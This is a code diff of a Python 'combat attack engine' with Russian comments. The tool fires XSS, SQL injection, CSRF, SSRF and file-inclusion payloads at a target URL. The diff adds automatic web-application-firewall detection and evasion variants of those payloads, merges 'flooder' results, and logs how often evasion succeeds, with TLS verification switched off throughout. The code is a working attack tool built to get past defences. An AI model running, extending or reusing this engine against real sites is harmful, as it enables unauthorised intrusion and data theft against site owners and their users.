@@ -1,7 +1,6 @@
 # xss_security_gui/combat_attack_engine.py
 """
 Combat Attack Engine — Реальные боевые сетевые атаки
-Автор: GitHub Copilot
 """
 import time
 import json
@@ -12,6 +11,9 @@ from typing import Dict, List, Any, Callable, Optional
 from urllib.parse import urljoin, urlparse, parse_qs, urlencode
 from datetime import datetime
 import logging
+
+from xss_security_gui.core.waf_engine import WAFDetector, HTTPEvasionWrapper, WAFType
+from xss_security_gui.core.waf_monitor import get_waf_monitor
 
 logger = logging.getLogger("CombatAttackEngine")
 
@@ -87,12 +89,16 @@ class AttackResult:
         self.evidence = []
         self.severity = "INFO"
         self.notes = ""
+        self.detected_waf: Optional[WAFType] = None
+        self.waf_confidence: float = 0.0
+        self.evasion_attempts: int = 0
+        self.evasion_success: bool = False
 
     def to_dict(self) -> Dict[str, Any]:
         return {
             "attack_type": self.attack_type,
             "endpoint": self.endpoint,
-            "payload": self.payload[:100],  # Truncate payload
+            "payload": self.payload[:100],
             "vulnerable": self.vulnerable,
             "severity": self.severity,
             "response_code": self.response_code,
@@ -100,6 +106,10 @@ class AttackResult:
             "timestamp": self.timestamp,
             "notes": self.notes,
             "evidence_count": len(self.evidence),
+            "detected_waf": self.detected_waf.value if self.detected_waf else None,
+            "waf_confidence": self.waf_confidence,
+            "evasion_attempts": self.evasion_attempts,
+            "evasion_success": self.evasion_success,
         }
 
 
@@ -111,6 +121,7 @@ class CombatAttackEngine:
     """
     Боевой двигатель атак.
     Выполняет реальные XSS, SQLi, CSRF, SSRF, LFI атаки.
+    Интегрирован с WAFDetector 13.0 для автоматического обхода WAF.
     Результаты отправляются в очередь для GUI.
     """
 
@@ -129,6 +140,13 @@ class CombatAttackEngine:
             "User-Agent": "Mozilla/5.0 (XSS-Scanner v6.0)",
             "Accept": "*/*"
         })
+
+        # WAFDetector 13.0 Integration
+        self.waf_detector = WAFDetector()
+        self.waf_monitor = get_waf_monitor()
+        self.waf_evasion_wrapper = HTTPEvasionWrapper(self.session.headers.copy())
+        self.detected_waf: Optional[WAFType] = None
+        self.waf_detection_confidence: float = 0.0
 
         self.attack_results: List[AttackResult] = []
         self.total_attacks = 0
@@ -171,12 +189,70 @@ class CombatAttackEngine:
         progress_pct = int((self.completed_attacks / max(1, self.total_attacks)) * 100)
         self._emit_progress(f"🎯 Атак выполнено: {self.completed_attacks}/{self.total_attacks}", progress_pct)
 
+    def _detect_and_adapt_waf(self) -> Optional[WAFType]:
+        """Обнаружить WAF и адаптировать payload для обхода"""
+        if self.detected_waf:
+            return self.detected_waf
+
+        try:
+            resp = self.session.get(self.target_url, timeout=self.timeout, verify=False)
+            detected = self.waf_detector.detect_waf(
+                self.target_url,
+                resp.text,
+                dict(resp.headers),
+                resp.status_code
+            )
+
+            if detected:
+                waf_info = self.waf_detector.detected_wafes.get(self.target_url, {})
+                self.waf_detection_confidence = waf_info.get("confidence", 0.0)
+                self.detected_waf = detected
+
+                # Record in WAF Monitor
+                self.waf_monitor.record_waf_detection(
+                    self.target_url,
+                    detected,
+                    self.waf_detection_confidence,
+                    waf_info.get("score", 0)
+                )
+
+                self._emit_progress(
+                    f"⚠️ WAF обнаружен: {detected.value} (уверенность: {self.waf_detection_confidence * 100:.1f}%)",
+                    10
+                )
+                logger.info(f"WAF detected: {detected.value}")
+                return detected
+        except Exception as e:
+            logger.debug(f"WAF detection error: {e}")
+
+        return None
+
+    def _get_adapted_payloads(self, original_payload: str, max_variants: int = 15) -> List[str]:
+        """Получить адаптированные payload с учетом обнаруженного WAF"""
+        payloads = [original_payload]
+
+        try:
+            evasion_payloads = self.waf_detector.get_evasion_payloads(
+                original_payload,
+                self.detected_waf,
+                max_variants
+            )
+            payloads.extend(evasion_payloads)
+        except Exception as e:
+            logger.debug(f"Payload adaptation error: {e}")
+
+        return payloads[:max_variants]
+
     def attack_xss(self, endpoints: List[str] = None) -> List[AttackResult]:
         """Атака на XSS уязвимости"""
         if not endpoints:
             endpoints = [self.target_url]
 
         self._emit_progress(f"🔴 Начинаем XSS атаки на {len(endpoints)} endpoints...", 5)
+
+        # Обнаружить WAF
+        self._detect_and_adapt_waf()
+
         results = []
 
         for endpoint in endpoints:
@@ -188,45 +264,68 @@ class CombatAttackEngine:
                     break
 
                 result = AttackResult("XSS", endpoint, payload)
+                result.detected_waf = self.detected_waf
+                result.waf_confidence = self.waf_detection_confidence
 
                 try:
-                    # Попытка 1: GET параметр
-                    test_url = f"{endpoint}?q={payload}" if "?" not in endpoint else f"{endpoint}&q={payload}"
+                    # Получить адаптированные payload для обхода WAF
+                    adapted_payloads = self._get_adapted_payloads(payload, max_variants=10)
 
-                    start_time = time.time()
-                    resp = self.session.get(test_url, timeout=self.timeout, verify=False)
-                    result.response_time = time.time() - start_time
-                    result.response_code = resp.status_code
-                    result.response_body = resp.text[:1000]
-                    result.success = True
+                    for attempt_num, test_payload in enumerate(adapted_payloads, 1):
+                        if self.stop_flag.is_set():
+                            break
 
-                    # Анализ ответа на наличие payload
-                    if payload in resp.text:
-                        result.vulnerable = True
-                        result.severity = "HIGH"
-                        result.evidence.append(f"Payload отражен в ответе")
-                        result.notes = f"Потенциально уязвим на XSS (отражен payload)"
-                    elif "error" in resp.text.lower() or "invalid" in resp.text.lower():
-                        result.severity = "MEDIUM"
-                        result.notes = "Возможна парсинговая ошибка"
+                        result.evasion_attempts = attempt_num
 
-                    # Попытка 2: POST параметр
-                    if not result.vulnerable:
+                        # Попытка 1: GET параметр
+                        test_url = f"{endpoint}?q={test_payload}" if "?" not in endpoint else f"{endpoint}&q={test_payload}"
+
                         try:
-                            post_resp = self.session.post(endpoint,
-                                                          data={"q": payload},
-                                                          timeout=self.timeout,
-                                                          verify=False)
-                            if payload in post_resp.text:
+                            start_time = time.time()
+                            resp = self.session.get(test_url, timeout=self.timeout, verify=False)
+                            result.response_time = time.time() - start_time
+                            result.response_code = resp.status_code
+                            result.response_body = resp.text[:1000]
+                            result.success = True
+
+                            # Анализ ответа на наличие payload
+                            if payload in resp.text:
                                 result.vulnerable = True
                                 result.severity = "HIGH"
-                                result.evidence.append(f"Payload отражен в POST ответе")
-                                result.notes = "Уязвим на XSS (POST)"
-                        except Exception:
-                            pass
+                                result.evidence.append(f"Payload отражен в ответе (попытка {attempt_num})")
+                                result.notes = f"Уязвим на XSS (отражен payload)"
+                                result.evasion_success = True
+                                break
+                            elif "error" in resp.text.lower() or "invalid" in resp.text.lower():
+                                if not result.vulnerable:
+                                    result.severity = "MEDIUM"
+                                    result.notes = "Возможна парсинговая ошибка"
 
-                    self._emit_result(result)
-                    results.append(result)
+                        except Exception as e:
+                            logger.debug(f"XSS GET attempt {attempt_num} error: {e}")
+                            continue
+
+                        # Попытка 2: POST параметр
+                        if not result.vulnerable and attempt_num <= 3:
+                            try:
+                                post_resp = self.session.post(endpoint,
+                                                              data={"q": test_payload},
+                                                              timeout=self.timeout,
+                                                              verify=False)
+                                if payload in post_resp.text:
+                                    result.vulnerable = True
+                                    result.severity = "HIGH"
+                                    result.evidence.append(f"Payload отражен в POST ответе (попытка {attempt_num})")
+                                    result.notes = "Уязвим на XSS (POST)"
+                                    result.evasion_success = True
+                                    break
+                            except Exception:
+                                pass
+
+                    if result.vulnerable or result.success:
+                        self._emit_result(result)
+                        results.append(result)
+
                     time.sleep(0.1)  # Rate limit
 
                 except Exception as e:
@@ -252,37 +351,59 @@ class CombatAttackEngine:
                     break
 
                 result = AttackResult("SQLi", f"{self.target_url}?{param_name}=...", payload)
+                result.detected_waf = self.detected_waf
+                result.waf_confidence = self.waf_detection_confidence
 
                 try:
-                    test_params = {param_name: payload}
+                    # Получить адаптированные payload
+                    adapted_payloads = self._get_adapted_payloads(payload, max_variants=8)
 
-                    start_time = time.time()
-                    resp = self.session.get(self.target_url,
-                                           params=test_params,
-                                           timeout=self.timeout,
-                                           verify=False)
-                    result.response_time = time.time() - start_time
-                    result.response_code = resp.status_code
-                    result.response_body = resp.text[:1000]
-                    result.success = True
+                    for attempt_num, test_payload in enumerate(adapted_payloads, 1):
+                        if self.stop_flag.is_set():
+                            break
 
-                    # Анализ на SQLi признаки
-                    sqli_indicators = ["sql", "syntax", "error", "mysql", "postgresql", "oracle", "database"]
-                    if any(ind in resp.text.lower() for ind in sqli_indicators):
-                        result.vulnerable = True
-                        result.severity = "CRITICAL"
-                        result.evidence.append("SQL ошибка в ответе")
-                        result.notes = "Потенциально уязвим на SQLi"
+                        result.evasion_attempts = attempt_num
 
-                    # Проверка времени ответа (time-based SQLi)
-                    if result.response_time > 5.0:
-                        result.notes += f" (Время ответа: {result.response_time:.2f}s - возможен time-based SQLi)"
-                        if not result.vulnerable:
-                            result.vulnerable = True
-                            result.severity = "HIGH"
+                        try:
+                            test_params = {param_name: test_payload}
 
-                    self._emit_result(result)
-                    results.append(result)
+                            start_time = time.time()
+                            resp = self.session.get(self.target_url,
+                                                   params=test_params,
+                                                   timeout=self.timeout,
+                                                   verify=False)
+                            result.response_time = time.time() - start_time
+                            result.response_code = resp.status_code
+                            result.response_body = resp.text[:1000]
+                            result.success = True
+
+                            # Анализ на SQLi признаки
+                            sqli_indicators = ["sql", "syntax", "error", "mysql", "postgresql", "oracle", "database"]
+                            if any(ind in resp.text.lower() for ind in sqli_indicators):
+                                result.vulnerable = True
+                                result.severity = "CRITICAL"
+                                result.evidence.append(f"SQL ошибка в ответе (попытка {attempt_num})")
+                                result.notes = "Потенциально уязвим на SQLi"
+                                result.evasion_success = True
+                                break
+
+                            # Проверка времени ответа (time-based SQLi)
+                            if result.response_time > 5.0:
+                                result.notes = f"Время ответа: {result.response_time:.2f}s - возможен time-based SQLi (попытка {attempt_num})"
+                                if not result.vulnerable:
+                                    result.vulnerable = True
+                                    result.severity = "HIGH"
+                                    result.evasion_success = True
+                                    break
+
+                        except Exception as e:
+                            logger.debug(f"SQLi attempt {attempt_num} error: {e}")
+                            continue
+
+                    if result.vulnerable or result.success:
+                        self._emit_result(result)
+                        results.append(result)
+
                     time.sleep(0.2)
 
                 except Exception as e:
@@ -296,14 +417,15 @@ class CombatAttackEngine:
         self._emit_progress(f"🟡 Проверяем CSRF защиту...", 55)
         results = []
 
-        for payload in CSRF_PAYLOADS[:3]:  # Ограничиваем количество
+        for payload in CSRF_PAYLOADS[:3]:
             if self.stop_flag.is_set():
                 break
 
             result = AttackResult("CSRF", self.target_url, payload)
+            result.detected_waf = self.detected_waf
+            result.waf_confidence = self.waf_detection_confidence
 
             try:
-                # Проверяем наличие CSRF токена в форме
                 resp = self.session.get(self.target_url, timeout=self.timeout, verify=False)
                 result.response_code = resp.status_code
                 result.success = True
@@ -338,25 +460,45 @@ class CombatAttackEngine:
                 break
 
             result = AttackResult("SSRF", self.target_url, payload)
+            result.detected_waf = self.detected_waf
+            result.waf_confidence = self.waf_detection_confidence
 
             try:
-                test_url = f"{self.target_url}?url={payload}" if "?" not in self.target_url else f"{self.target_url}&url={payload}"
+                # Получить адаптированные payload
+                adapted_payloads = self._get_adapted_payloads(payload, max_variants=5)
 
-                start_time = time.time()
-                resp = self.session.get(test_url, timeout=self.timeout, verify=False)
-                result.response_time = time.time() - start_time
-                result.response_code = resp.status_code
-                result.success = True
+                for attempt_num, test_payload in enumerate(adapted_payloads, 1):
+                    if self.stop_flag.is_set():
+                        break
 
-                # Анализ на SSRF признаки
-                if resp.status_code == 200 and len(resp.text) > 100:
-                    result.vulnerable = True
-                    result.severity = "CRITICAL"
-                    result.evidence.append("Возможен доступ к внутренним ресурсам")
-                    result.notes = "Потенциально уязвим на SSRF"
+                    result.evasion_attempts = attempt_num
 
-                self._emit_result(result)
-                results.append(result)
+                    try:
+                        test_url = f"{self.target_url}?url={test_payload}" if "?" not in self.target_url else f"{self.target_url}&url={test_payload}"
+
+                        start_time = time.time()
+                        resp = self.session.get(test_url, timeout=self.timeout, verify=False)
+                        result.response_time = time.time() - start_time
+                        result.response_code = resp.status_code
+                        result.success = True
+
+                        # Анализ на SSRF признаки
+                        if resp.status_code == 200 and len(resp.text) > 100:
+                            result.vulnerable = True
+                            result.severity = "CRITICAL"
+                            result.evidence.append(f"Возможен доступ к внутренним ресурсам (попытка {attempt_num})")
+                            result.notes = "Потенциально уязвим на SSRF"
+                            result.evasion_success = True
+                            break
+
+                    except Exception as e:
+                        logger.debug(f"SSRF attempt {attempt_num} error: {e}")
+                        continue
+
+                if result.vulnerable or result.success:
+                    self._emit_result(result)
+                    results.append(result)
+
                 time.sleep(0.1)
 
             except Exception as e:
@@ -374,24 +516,44 @@ class CombatAttackEngine:
                 break
 
             result = AttackResult("LFI", self.target_url, payload)
+            result.detected_waf = self.detected_waf
+            result.waf_confidence = self.waf_detection_confidence
 
             try:
-                test_url = f"{self.target_url}?file={payload}" if "?" not in self.target_url else f"{self.target_url}&file={payload}"
+                # Получить адаптированные payload
+                adapted_payloads = self._get_adapted_payloads(payload, max_variants=5)
 
-                resp = self.session.get(test_url, timeout=self.timeout, verify=False)
-                result.response_code = resp.status_code
-                result.success = True
+                for attempt_num, test_payload in enumerate(adapted_payloads, 1):
+                    if self.stop_flag.is_set():
+                        break
 
-                # Анализ на LFI признаки
-                lfi_indicators = ["root:", "bin:", "daemon:", "nobody:"]  # /etc/passwd indicators
-                if any(ind in resp.text for ind in lfi_indicators):
-                    result.vulnerable = True
-                    result.severity = "CRITICAL"
-                    result.evidence.append("Файл /etc/passwd может быть доступен")
-                    result.notes = "Потенциально уязвим на LFI"
+                    result.evasion_attempts = attempt_num
 
-                self._emit_result(result)
-                results.append(result)
+                    try:
+                        test_url = f"{self.target_url}?file={test_payload}" if "?" not in self.target_url else f"{self.target_url}&file={test_payload}"
+
+                        resp = self.session.get(test_url, timeout=self.timeout, verify=False)
+                        result.response_code = resp.status_code
+                        result.success = True
+
+                        # Анализ на LFI признаки
+                        lfi_indicators = ["root:", "bin:", "daemon:", "nobody:"]
+                        if any(ind in resp.text for ind in lfi_indicators):
+                            result.vulnerable = True
+                            result.severity = "CRITICAL"
+                            result.evidence.append(f"Файл /etc/passwd может быть доступен (попытка {attempt_num})")
+                            result.notes = "Потенциально уязвим на LFI"
+                            result.evasion_success = True
+                            break
+
+                    except Exception as e:
+                        logger.debug(f"LFI attempt {attempt_num} error: {e}")
+                        continue
+
+                if result.vulnerable or result.success:
+                    self._emit_result(result)
+                    results.append(result)
+
                 time.sleep(0.1)
 
             except Exception as e:
@@ -403,6 +565,9 @@ class CombatAttackEngine:
         """Запустить все атаки последовательно"""
         self._emit_progress("🚀 Запуск полного боевого цикла атак...", 1)
 
+        # Обнаружить WAF перед началом
+        self._detect_and_adapt_waf()
+
         all_results = {
             "xss": self.attack_xss(),
             "sqli": self.attack_sqli(),
@@ -411,14 +576,69 @@ class CombatAttackEngine:
             "lfi": self.attack_lfi(),
         }
 
+        # ============================================
+        # 🔥 FLOODER INTEGRATION (XSS Flooder ULTRA)
+        # ============================================
+        try:
+            from xss_security_gui.auto_recon.xss_flooder import ai_learning_data
+
+            flood_xss = [
+                {"payload": p, "type": "xss", "vulnerable": True}
+                for p in ai_learning_data.get("successful_xss", [])
+            ]
+
+            flood_sqli = [
+                {"payload": p, "type": "sqli", "vulnerable": True}
+                for p in ai_learning_data.get("successful_sqli", [])
+            ]
+
+            all_results["flood_xss"] = flood_xss
+            all_results["flood_sqli"] = flood_sqli
+
+            # Combat event → GUI
+            self.result_queue.put({
+                "type": "flooder_results",
+                "data": {
+                    "xss_found": len(flood_xss),
+                    "sqli_found": len(flood_sqli),
+                    "payloads_xss": flood_xss,
+                    "payloads_sqli": flood_sqli,
+                },
+                "timestamp": datetime.now().isoformat()
+            })
+
+        except Exception as e:
+            logger.error(f"[CombatAttackEngine] Flooder integration error: {e}")
+
         # Анализ результатов
         vulnerable_count = sum(1 for results in all_results.values()
                                for r in results if r.vulnerable)
         critical_count = sum(1 for results in all_results.values()
                             for r in results if r.severity == "CRITICAL")
+        successful_evasion_count = sum(1 for results in all_results.values()
+                                      for r in results if r.evasion_success)
+
+        # Запись статистики обходов в WAF Monitor
+        if self.detected_waf:
+            for results in all_results.values():
+                for r in results:
+                    if r.evasion_success:
+                        self.waf_monitor.record_evasion_attempt(
+                            self.detected_waf,
+                            success=True,
+                            payload_variant=r.payload[:50]
+                        )
+                    elif r.evasion_attempts > 0:
+                        self.waf_monitor.record_evasion_attempt(
+                            self.detected_waf,
+                            success=False,
+                            payload_variant=r.payload[:50]
+                        )
+
+        waf_info = f" (WAF: {self.detected_waf.value} {self.waf_detection_confidence * 100:.1f}%)" if self.detected_waf else " (No WAF detected)"
 
         self._emit_progress(
-            f"✅ Атаки завершены! Найдено уязвимостей: {vulnerable_count}, CRITICAL: {critical_count}",
+            f"✅ Атаки завершены! Уязвимостей: {vulnerable_count}, CRITICAL: {critical_count}, Успешных обходов: {successful_evasion_count}{waf_info}",
             100
         )
 
@@ -428,6 +648,12 @@ class CombatAttackEngine:
             "total_attacks": self.completed_attacks,
             "vulnerable_found": vulnerable_count,
             "critical_severity": critical_count,
+            "successful_evasions": successful_evasion_count,
+            "detected_waf": self.detected_waf.value if self.detected_waf else None,
+            "waf_confidence": self.waf_detection_confidence,
+            "waf_evasion_success_rate": self.waf_monitor.evasion_stats.get(
+                self.detected_waf.value if self.detected_waf else None, {}
+            ).get("success_rate", 0.0),
             "results_by_type": all_results,
         }
 
